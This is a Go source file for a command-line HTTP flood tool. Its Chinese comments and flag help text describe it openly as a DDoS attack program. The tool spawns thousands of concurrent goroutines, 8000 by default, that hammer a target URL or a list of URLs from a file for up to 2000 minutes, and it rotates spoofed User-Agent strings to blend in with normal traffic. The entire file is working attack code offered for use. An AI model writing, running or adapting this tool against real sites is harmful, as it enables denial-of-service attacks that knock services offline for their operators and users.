package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gookit/color"
)

var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int
	FilePath            string // 新增 -f 参数
	DDosHttpClient      = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 60 * time.Second,
				}
				return dialer.Dial(network, addr)
			},
		},
	}
	UserAgents = []string{
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	}
)

func main() {
	defaultTargetUrl := "https://www.yoursite.com"

	flag.StringVar(&Method, "m", "GET", "DDos攻击目标URL请求方式(GET/POST/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDos攻击的目标URL")
	flag.StringVar(&FilePath, "f", "", "包含多个URL的文件路径") // 新增 -f 参数
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发用户数量")
	flag.IntVar(&IntervalMillisecond, "ims", 1000, "每个用户执行DDos攻击的频率（毫秒）")
	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间（分钟）")
	flag.Parse()

	if FilePath != "" {
		var err error
		// 读取文件中的 URL
		urls, err := readURLsFromFile(FilePath)
		if err != nil {
			fmt.Println("无法读取文件中的URL：", err)
			return
		}
		if len(urls) > 0 {
			TargetUrl = "" // 如果提供了文件路径，忽略命令行中的目标 URL
		}
	}

	if TargetUrl == defaultTargetUrl && FilePath == "" {
		color.Printf("TargetUrl is %s, 请尝试通过命令行传参数重新启动。Usage：<red>./goddos -h</>\n", TargetUrl)
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < ConcurrencyCount; i++ {
		wg.Add(1)
		go func(index int) {
			defer wg.Done()
			DoAttacking(index, FilePath)
		}(i)
	}

	// 使用 WaitGroup 等待所有 goroutine 完成
	wg.Wait()
	fmt.Printf("攻击完成，持续时间：%d分钟\n", DurationMinute)
}

func DoAttacking(grindex int, filePath string) {
	for i := 0; ; i++ {
		var targetURL string
		if filePath != "" {
			// 如果提供了文件路径，从文件中获取目标 URL
			urls, err := readURLsFromFile(filePath)
			if err != nil {
				fmt.Printf("[Goroutine#%d/%d]错误：%s\n", grindex, i, err.Error())
				continue
			}
			if len(urls) == 0 {
				continue
			}
			targetURL = urls[rand.Intn(len(urls))]
		} else {
			targetURL = TargetUrl
		}

		result, err := DoHttpRequest(targetURL)
		if err != nil {
			fmt.Printf("[Goroutine#%d/%d]错误：%s\n", grindex, i, err.Error())
			continue
		}
		responseStatus := fmt.Sprintf("(%s)", *result)
		if !strings.Contains(*result, "200 OK") {
			responseStatus = fmt.Sprintf("(%s)", *result)
		}
		fmt.Printf("[Goroutine#%d/%d]%s\n", grindex, i, responseStatus)

		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
	}
}

func DoHttpRequest(targetURL string) (*string, error) {
	request, err := http.NewRequest(Method, targetURL, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	// 在读取响应体前关闭
	defer response.Body.Close()

	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)

	return &response.Status, err
}

func readURLsFromFile(filePath string) ([]string, error) {
	var urls []string

	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		u := scanner.Text()
		// 检查URL的有效性
		if _, err := http.NewRequest("GET", u, nil); err != nil {
			fmt.Printf("Invalid URL: %s\n", u)
			continue
		}
		urls = append(urls, u)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return urls, nil
}
